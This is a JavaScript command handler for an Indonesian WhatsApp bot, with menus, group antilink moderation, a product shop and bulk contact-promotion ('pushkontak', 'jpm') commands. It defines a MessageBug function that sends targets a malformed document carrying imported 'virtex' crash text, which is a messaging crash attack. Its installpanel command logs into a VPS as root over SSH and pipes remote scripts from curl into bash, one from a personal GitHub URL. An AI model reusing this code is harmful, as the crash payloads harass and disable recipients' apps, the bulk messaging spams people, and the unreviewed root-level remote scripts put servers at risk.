module.exports = async (inzie, m, store) => {
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const cmd = prefix + command
const { Client } = require('ssh2')
const args = body.trim().split(/ +/).slice(1)
const rdm = () =>{
const randomNumbers = [];
for (let i = 0; i < 10; i++) {
  const randomNumber = Math.floor(Math.random() * 10);
  randomNumbers.push(randomNumber);
}
return randomNumbers.join('')
}
const makeid = rdm()
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const text = q = args.join(" ")
const botNumber = await inzie.decodeJid(inzie.user.id)
const isOwner = m.sender == owner+"@s.whatsapp.net" ? true : m.sender == botNumber ? true : false
const isGroup = m.chat.endsWith('@g.us')
const senderNumber = m.sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await inzie.groupMetadata(m.chat) : {}
let participant_bot = isGroup ? groupMetadata?.participants?.find((v) => v.id == botNumber) : ''
let participant_sender = isGroup ? groupMetadata?.participants?.find((v) => v.id == m.sender) : ''
const isBotAdmin = participant_bot?.admin !== null ? true : false
const isAdmin = participant_sender?.admin !== null ? true : false
const uploadImage = require('./all/uploadImage')
const { version } = require("./package.json")
const { runtime, getRandom, getTime, tanggal, toRupiah, pinterest, ucapan, generateProfilePicture, getBuffer, fetchJson } = require('./all/function.js')
const { toAudio, toPTT, toVideo, ffmpeg } = require("./all/converter.js")
const antilink = JSON.parse(fs.readFileSync('./all/database/antilink.json'))
const antilink2 = JSON.parse(fs.readFileSync('./all/database/antilink2.json'))
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
const reseller = JSON.parse(fs.readFileSync("./all/database/reseller.json"))
const { teksbug1 } = require("./all/database/virtex.js")
const { teksbug2 } = require("./all/database/delay.js")
let isReseller = reseller.includes(m.sender)
if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(namabot), color(`[ PESAN ]`, `blue`), color(`FROM`, `blue`), color(`${senderNumber}`, `blue`), color(`Text :`, `blue`), color(`${cmd}`, `white`))
}

const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `Hello My Friends`
}}}

const MessageBug = async (target) => {
return inzie.sendMessage(target, {document: fs.readFileSync("./package.json"), mimetype: "😄😇😂🔥", fileName: "Paket.zip", fileLength: 99999999999, caption: `key.com${teksbug2}`}, {quoted: qbug})
}

let ppuser
try {
ppuser = await inzie.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/50a488fd1eb4a71855e30.jpg'
}
async function inzieReply(teks) {
return inzie.sendMessage(m.chat, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
showAdAttribution: true, thumbnailUrl: ppuser, title: "｢ ACCESS DENIED ｣", body: "© Powered By "+namabot, previewType: "PHOTO"}}}, {quoted: m})
}

const qpayment = {
key: {
remoteJid: '0@s.whatsapp.net',
fromMe: false,
id: `ownername`,
participant: '0@s.whatsapp.net'
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: "USD",
amount1000: 999999999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: namabot
}},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: "INR"
}}}}

const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363298682648906@newsletter`,
newsletterName: `Hore`,
jpegThumbnail: "",
caption: `Powered By ${namaowner}`,
inviteExpiration: Date.now() + 1814400000
}
}}

const qtoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
}, message: {
"productMessage": {
"product": {
"productImage": {
"mimetype": "image/jpeg",
"jpegThumbnail": "",
},
"title": `Pterodactyl Server By ${namaowner}`,
"description": null,
"currencyCode": "IDR",
"priceAmount1000": "9999999999",
"retailerId": `Powered By inzie`,
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}}
}

const qtext = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "0@s.whatsapp.net"} : {}) },'message': {extendedTextMessage: {text: "Thank you for using my services"}}}

const qdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: `Powered By ${namaowner}`, jpegThumbnail: ""}}}

const qloc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot JPM By Skzyoo`,jpegThumbnail: ""}}}

const qloc2 = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot Pushkontak By Skzyo`,jpegThumbnail: ""}}}

const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `${namaowner}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6281515881647:+62 815-1588-16471\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

if (global.owneroff && !isCmd) {
if (!isGroup && !isOwner) {
let teks = `*Hai Kak* @${m.sender.split('@')[0]}

Maaf *Ownerku Sedang Offline*, Silahkan Tunggu Owner Kembali Online & Jangan Spam Chat`
return inzie.sendMessage(m.chat, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
showAdAttribution: true, thumbnail: fs.readFileSync("./media/ownermode.jpg"), renderLargerThumbnail: false, title: "｢ OWNER OFFLINE MODE ｣", mediaUrl: linkgc, sourceUrl: linkyt, previewType: "PHOTO"}}}, {quoted: null})
}}

if (antilink.includes(m.chat)) {
if (!isBotAdmin) return
if (!isAdmin && !isOwner && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await inzie.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await inzie.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Maaf Kamu Akan Saya Keluarkan Dari Grup Ini Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnail: fs.readFileSync("./media/warning.jpg"), title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await inzie.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await inzie.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}
}}

if (antilink2.includes(m.chat)) {
if (!isBotAdmin) return
if (!isAdmin && !isOwner && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await inzie.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await inzie.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Maaf Pesan Kamu Saya Hapus Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnail: fs.readFileSync("./media/warning.jpg"), title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await inzie.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
}
}}

let example = (teks) => {
return `\n*Contoh Penggunaan :*\nketik *${cmd}* ${teks}\n`
}

var resize = async (image, width, height) => {
let oyy = await Jimp.read(image)
let kiyomasa = await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG)
return kiyomasa
}

function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}


switch (command) {
case "menu-1": {

let teksnya = `
*Haii* @${m.sender.split("@")[0]},\nAda Yang Bisa Saya Bantu Kak?

 ┏━ ⊑ *INFO BOT* ⊒
┃ꆜ *Botname* : ${global.namabot2}
┃ꆜ *Creator* : ${global.owner}
┃ꆜ *Runtime* : ${runtime(process.uptime())}
┃ꆜ *Versi* : ${version}
┃ꆜ *Platfrom* : Chrome ( Ubuntu )
┗━━━━━━━━━━━━━━`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./media/thumbnail.jpg")}, { upload: inzie.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "List Menu", "sections": [{ "title": "# Pilih Salah Satu Menu Di Bawah Ini", "highlight_label": \"Powered By ${namaowner}\", "rows": [{ "header": "Allmenu", "title": "List All Fitur Bot", "id": ".allmenu" }, 
{ "header": "Mainmenu", "title": "List Main Menu", "id": ".mainmenu" }, 
{ "header": "Produkmenu", "title": "List Produk Owner", "id": ".produkmenu" }, 
{ "header": "Downloader", "title": "List Download Menu", "id": ".downloadmenu" }, 
{ "header": "Converter", "title": "List Convert Menu", "id": ".convertmenu" }, 
{ "header": "Panelmenu", "title": "List Panel Menu", "id": ".panelmenu" }, 
{ "header": "Domainmenu", "title": "List Domain Menu", "id": ".domainmenu" }, 
{ "header": "Pushkontakmenu", "title": "List Pushkontak Menu", "id": ".pushkontakmenu" }, 
{ "header": "Grupmenu", "title": "List Grup Menu", "id": ".grupmenu" }, 
{ "header": "Ownermenu", "title": "List Owner Menu", "id": ".ownermenu" }]}]}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Script Bot💌\",\"url\":\"${global.linkyt}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Profile Owner👤\",\"url\":\"${global.linkyt}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{ 
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Owner Bot🦅\",\"title\":\"Kontak Owner\",\"id\":\".owner\"}" 
}]
}) 
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await inzie.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break

case "menu": {

let teksmenu = `
*Haii* @${m.sender.split("@")[0]},\nAda Yang Bisa Saya Bantu Kak?

 ┏━ ⊑ *INFO BOT* ⊒
┃ꆜ *Botname* : ${global.namabot2}
┃ꆜ *Creator* : ${global.owner}
┃ꆜ *Runtime* : ${runtime(process.uptime())}
┃ꆜ *Versi* : ${version}
┃ꆜ *Platfrom* : Chrome ( Ubuntu )
┗━━━━━━━━━━━━━━

𝗦𝗜𝗟𝗔𝗛𝗞𝗔𝗡 𝗣𝗜𝗟𝗜𝗛 𝗠𝗘𝗡𝗨 𝗬𝗔𝗡𝗚 𝗜𝗡𝗚𝗜𝗡 𝗗𝗜𝗧𝗔𝗠𝗣𝗜𝗟𝗞𝗔𝗡 𝗗𝗜𝗕𝗔𝗪𝗔𝗛 𝗬𝗔!!!!`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "𝗠𝗘𝗡𝗨 𝗧𝗘𝗥𝗦𝗘𝗗𝗜𝗔", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"𝗡𝗘𝗪 𝗙𝗘𝗔𝗧𝗨𝗥𝗘\", "rows": [{ "header": "𝗠𝗘𝗡𝗨 𝗦𝗟𝗜𝗗𝗘/𝗚𝗘𝗦𝗘𝗥", "title": "𝗠𝗘𝗡𝗨 𝗧𝗘𝗥𝗕𝗔𝗥𝗨 𝗗𝗔𝗡 𝗠𝗘𝗡𝗔𝗥𝗜𝗞", "id": ".menu-new" }, 
{ "header": "𝗠𝗘𝗡𝗨 𝗕𝗨𝗧𝗧𝗢𝗡", "title": "𝗠𝗘𝗡𝗨 𝗕𝗘𝗧𝗢𝗡 𝗦𝗜𝗠𝗣𝗟𝗘", "id": ".menu-1" }, 
{ "header": "𝗦𝗘𝗠𝗨𝗔 𝗠𝗘𝗡𝗨", "title": "𝗧𝗔𝗠𝗣𝗜𝗟𝗞𝗔𝗡 𝗦𝗘𝗠𝗨𝗔 𝗠𝗘𝗡𝗨", "id": ".allmenu" }]}]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await inzie.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break

case "allmenu": {

let teksmenu = `
*Haii* @${m.sender.split("@")[0]}\nSelamat ${ucapan()}
 
*乂 M A I N M E N U*
* play
* tourl
* yts
* tohd
* chatgpt
* ai
* remini
* sticker
* pinterest
* qc
  
*乂 L I S T P R O D U C T*
* panel
* vps
* domain
* scriptbot
  
*乂 D O W N L O A D E R*
* tiktok
* tiktokmp3
* tiktokaudio
* tiktokslide
* instagram
* facebook
* ytmp3
* mediafire
  
*乂 C O N V E R T E R*
* toaudio
* tomp3
* tovn
* toptv
* tts
* toimage
  
*乂 P A N E L M E N U*
* addseller
* delseller
* listseller
* addadmin
* addadmin2
* cpanel
* cpanel2
* cpanel3
* listpanel
* listadmin
* deladmin
* delpanel
  
*乂 D O M A I N M E N U*
* listdomain
* listsubdomain
* delsubdomain
  
*乂 P U S H M E N U*
* pushkontak
* pushkontak1
* pushkontak2
* savekontak
* savekontak2
* listgc
* idgc
* jpm
* jpm2
* jpmpromosi
* jpmtesti
* jpmhidetag
* startjpm
* setteksjpm
* teksjpm

*乂 G R O U P M E N U*
* addmember
* antilink
* antilinkV2
* hidetag
* tagall
* delete
* open/close
* setnamagc
* setdeskgc
* setppgc
* kick
* promote
* leavegc
* leavegc2
* demote
  
*乂 O W N E R M E N U*
* clearsession
* modeoff
* modeon
* done
* anticall
* autoread
* welcome
* setthumbnail
* setppbotpanjang
* setppbot
* setnamabot
* setbiobot
* jpmslide
`
inzie.sendOrder(m.chat, teksmenu, fs.readFileSync('./media/thumbnail.jpg'), "99999999", 10000000, qchanel)
}
break

case "mainmenu": {

let teksmenu = `
*Haii* @${m.sender.split("@")[0]}\nSelamat ${ucapan()}

*乂 M A I N M E N U*
* play
* tourl
* yts
* tohd
* chatgpt
* ai
* remini
* sticker
* pinterest
* qc
`
inzie.sendMessage(m.chat, {text: `${teksmenu}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: fs.readFileSync("./media/thumbnail2.jpg"), title: `© ${namabot} - ${version}`, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt, previewType: "PHOTO"}}}, {quoted: qchanel})
}
break
case "downloadmenu": {

let teksmenu = `
*Haii* @${m.sender.split("@")[0]}\nSelamat ${ucapan()}

*乂 D O W N L O A D E R*
* tiktok
* tiktokmp3
* tiktokaudio
* tiktokslide
* instagram
* facebook
* ytmp3
* mediafire
`
inzie.sendMessage(m.chat, {text: `${teksmenu}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: fs.readFileSync("./media/thumbnail2.jpg"), title: `© ${namabot} - ${version}`, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt, previewType: "PHOTO"}}}, {quoted: qchanel})
}
break
case "produkmenu": {

let teksmenu = `
Silahkan Pilih List Harga Produk`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "List Harga Produk", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"Powered By ${namaowner}\", "rows": [{ "header": "Panel Pterodactyl", "title": "List Harga Panel", "id": ".list_panel" }, 
{ "header": "VPS", "title": "List Harga Vps", "id": ".list_vps" }, 
{ "header": "Domain", "title": "List Harga Domain", "id": ".list_domain" }, 
{ "header": "Script Bot", "title": "List Harga Script Bot", "id": ".list_scbot" }]}]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await inzie.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "pushkontakmenu": {

let teksmenu = `
*Haii* @${m.sender.split("@")[0]}\nSelamat ${ucapan()}

*乂 P U S H M E N U*
* pushkontak
* pushkontak1
* pushkontak2
* savekontak
* savekontak2
* listgc
* idgc
* jpm
* jpm2
* jpmpromosi
* jpmtesti
* jpmhidetag
* startjpm
* setteksjpm
* teksjpm
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Start Promosi\",\"title\":\"Start Promosi\",\"id\":\".startjpm\"}" 
}]
}) 
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await inzie.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break

case "installpanel" : {
    if (!isOwner) return inzieReply(msg.owner)
    let t = text.split(',');
    if (t.length < 5) return inzieReply(`*Format salah!*\nPenggunaan: ${prefix}installpanel ipvps,password,domainpnl,domainnode,ramvps (Contoh 80000 8gb)`);
    let ipvps = t[0];
    let passwd = t[1];
    let subdomain = t[2];
    let domainnode = t[3];
    let ramvps = t[4];
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };
    let password = crypto.randomBytes(2).toString('hex')
    const commandPanel = 'bash <(curl -s https://pterodactyl-installer.se)';
    const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';
    const conn = new Client();

    conn.on('ready', () => {
        inzieReply('*PROSES PENGINSTALLAN PANEL SEDANG BERLANGSUNG MOHON TUNGGU 5-10MENIT*');
        conn.exec(commandPanel, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Panel installation stream closed with code ' + code + ' and signal ' + signal);
                installWings(conn, domainnode, subdomain, password, ramvps);
            }).on('data', (data) => {
                handlePanelInstallationInput(data, stream, subdomain, password);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).connect(connSettings);

    async function installWings(conn, domainnode, subdomain, password, ramvps) {
        inzieReply('*PROSES PENGINSTALLAN WINGS SEDANG BERLANGSUNG MOHON TUNGGU 5-10MENIT*');
        conn.exec(commandWings, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Wings installation stream closed with code ' + code + ' and signal ' + signal);
                createNode(conn, domainnode, ramvps, subdomain, password);
            }).on('data', (data) => {
                handleWingsInstallationInput(data, stream, domainnode, subdomain);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    async function createNode(conn, domainnode, ramvps, subdomain, password) {
        const command = 'bash <(curl https://raw.githubusercontent.com/BotAnjayy4/Theme/refs/heads/main/install.sh)';
        inzieReply('*MEMULAI CREATE NODE & LOCATION*');

        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Node creation stream closed with code ' + code + ' and signal ' + signal);
                conn.end();
                sendPanelData(subdomain, password);
            }).on('data', (data) => {
                handleNodeCreationInput(data, stream, domainnode, ramvps);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    function sendPanelData(subdomain, password) {
        inzieReply(`*DATA PANEL ANDA*\n\n*USERNAME:* admin\n*PASSWORD:* ${password}\n*LOGIN:* ${subdomain}\n\nNote: Semua Instalasi Telah Selesai Silahkan Create Allocation Di Node Yang Di buat Oleh Bot Dan Ambil Token Configuration dan ketik .startwings (token) \nNote: *HARAP TUNGGU 1-5MENIT BIAR WEB BISA DI BUKA*`);
    }

    function handlePanelInstallationInput(data, stream, subdomain, password) {
        if (data.toString().includes('Input')) {
            stream.write('0\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('Asia/Jakarta\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${password}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('yes\n');
        }
        if (data.toString().includes('Please read the Terms of Service')) {
            stream.write('A\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleWingsInstallationInput(data, stream, domainnode, subdomain) {
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('user\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${domainnode}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleNodeCreationInput(data, stream, domainnode, ramvps) {
        stream.write('aisyahku\n');
        stream.write('4\n');
        stream.write('SGP\n');
        stream.write('AutoCnode inzie\n');
        stream.write(`${domainnode}\n`);
        stream.write('NODES\n');
        stream.write(`${ramvps}\n`);
        stream.write(`${ramvps}\n`);
        stream.write('1\n');
        console.log('STDOUT: ' + data);
    }
}

break  

case "convertmenu": {

let teksmenu = `
*Haii* @${m.sender.split("@")[0]}\nSelamat ${ucapan()}

*乂 C O N V E R T E R*
* toaudio
* tomp3
* tovn
* toptv
* tts
* toimage
`
inzie.sendMessage(m.chat, {text: `${teksmenu}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: fs.readFileSync("./media/thumbnail2.jpg"), title: `© ${namabot} - ${version}`, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt, previewType: "PHOTO"}}}, {quoted: qchanel})
}
break
case "panelmenu": {

let teksmenu = `
*Haii* @${m.sender.split("@")[0]}\nSelamat ${ucapan()}

*乂 P A N E L M E N U*
* addseller
* delseller
* listseller
* addadmin
* addadmin2
* cpanel
* cpanel2
* cpanel3
* listpanel
* listadmin
* deladmin
* delpanel`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "Klik Disini", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"Powered By ${namaowner}\", "rows": [{ "header": "List Panel", "title": "List Server Panel", "id": ".listpanel" }, 
{ "header": "List Admin", "title": "List Admin Panel", "id": ".listadmin" }, 
{ "header": "List Reseller", "title": "List Reseller Panel", "id": ".listseller" }]}]}`
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Create Panel Otomatis\",\"title\":\"Create Panel V2\",\"id\":\".cpanel2\"}" 
}]
}) 
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await inzie.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "domainmenu": {

let teksmenu = `
*Haii* @${m.sender.split("@")[0]}\nSelamat ${ucapan()}

*乂 D O M A I N M E N U*
* listdomain
* listsubdomain
* delsubdomain
`
inzie.sendMessage(m.chat, {text: `${teksmenu}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: fs.readFileSync("./media/thumbnail2.jpg"), title: `© ${namabot} - ${version}`, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt, previewType: "PHOTO"}}}, {quoted: qchanel})
}
break
case "grupmenu": {

let teksmenu = `
*Haii* @${m.sender.split("@")[0]}\nSelamat ${ucapan()}

*乂 G R O U P M E N U*
* addmember
* antilink
* antilinkV2
* hidetag
* tagall
* delete
* open/close
* setnamagc
* setdeskgc
* setppgc
* kick
* promote
* leavegc
* leavegc2
* demote
`
inzie.sendMessage(m.chat, {text: `${teksmenu}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: fs.readFileSync("./media/thumbnail2.jpg"), title: `© ${namabot} - ${version}`, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt, previewType: "PHOTO"}}}, {quoted: qchanel})
}
break
case "ownermenu": {

let teksmenu = `
*Haii* @${m.sender.split("@")[0]}\nSelamat ${ucapan()}

*乂 O W N E R M E N U*
* clearsession
* modeoff
* modeon
* done
* anticall
* autoread
* welcome
* setthumbnail
* setppbotpanjang
* setppbot
* setnamabot
* setbiobot
* jpmslide
`
inzie.sendMessage(m.chat, {text: `${teksmenu}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
